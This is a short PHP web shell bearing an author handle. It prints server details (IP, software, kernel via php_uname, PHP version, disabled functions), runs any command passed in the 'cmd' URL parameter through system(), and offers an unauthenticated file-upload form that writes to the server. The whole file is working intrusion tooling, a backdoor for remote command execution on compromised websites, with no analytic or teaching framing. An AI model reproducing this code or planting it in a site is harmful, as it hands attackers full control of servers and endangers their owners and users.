<?php
/*
    @ajayalf
*/
error_reporting(0);
$disable_functions = @ini_get('disable_functions');
echo "<pre>";
echo "<b>Server IP</b>: ".$_SERVER['SERVER_ADDR']."<br>";
echo "<b>Server</b>: ".$_SERVER['SERVER_SOFTWARE']."<br>";
echo "<b>System</b>: ".php_uname()."<br>";
echo "<b>PHP Version</b>: ".@phpversion()."<br>";
echo "<b>Disable Functions</b>: ".$disable_functions;
echo "</pre>";
if(isset($_GET["cmd"])){
	echo "<form method=get name=command action=>
	<input type=text name=cmd>
    <input type=submit value=Execution><pre>";
	if($_GET['cmd']){
		system($_GET['cmd']);
	}
}
if(isset($_GET["upload"])){
	echo "<form method=post enctype=multipart/form-data>
	<input type=file name=file>
	<input name=file type=submit id=file value=upload>";
	if($_POST["file"] == upload ){
		if(@copy($_FILES["file"]["tmp_name"],$_FILES["file"]["name"])){
		echo " 200 OK";
		} else {
		echo " Failed";
		}
	}
}
?>
